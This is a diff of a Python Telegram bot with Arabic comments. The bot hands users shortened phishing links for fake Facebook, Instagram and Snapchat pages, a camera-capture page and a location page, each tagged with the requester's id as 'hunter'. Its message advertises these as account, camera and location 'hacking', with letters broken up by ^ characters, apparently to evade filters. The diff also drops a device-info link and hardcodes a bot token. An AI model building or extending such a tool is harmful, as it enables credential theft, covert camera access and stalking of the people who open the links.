@@ -4,13 +4,13 @@ from flask import Flask
 from threading import Thread
 import os
 import logging
+import time
 
-# 1. كتم التنبيهات الحمراء عشان اللوغز يضل نظيف
+# كتم التنبيهات المزعجة
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
 app = Flask('')
-
 @app.route('/')
 def home():
     return "M.Y.9 System is Online"
@@ -23,9 +23,13 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- إعدادات البوت والتوكن تبعك ---
+# --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
+
+# حل مشكلة الـ Conflict 409
+bot.remove_webhook()
+time.sleep(1)
 
 def short_link(url):
     try:
@@ -39,18 +43,14 @@ def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
     hunter = first_name.replace(" ", "_")
-    
-    # رابط استضافتك الأساسي (تأكد إنه رابط الـ Pages تبعك)
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد الروابط مع ID واسم الصياد بالملي
     links = {
         "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
         "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
         "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}"),
         "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}"),
-        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}"),
-        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
+        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
     }
 
     msg = f"""
@@ -70,7 +70,6 @@ def send_welcome(message):
 🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
 🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
 🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
-🔹 سـ^ـحـ^ـب المـ^ـعـ^ـلـ^ـومـ^ـات 📱: `{links['sys']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
@@ -80,4 +79,4 @@ def send_welcome(message):
 if __name__ == "__main__":
     keep_alive()
     print("🚀 M.Y.9 System Started Successfully!")
-    bot.infinity_polling()
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
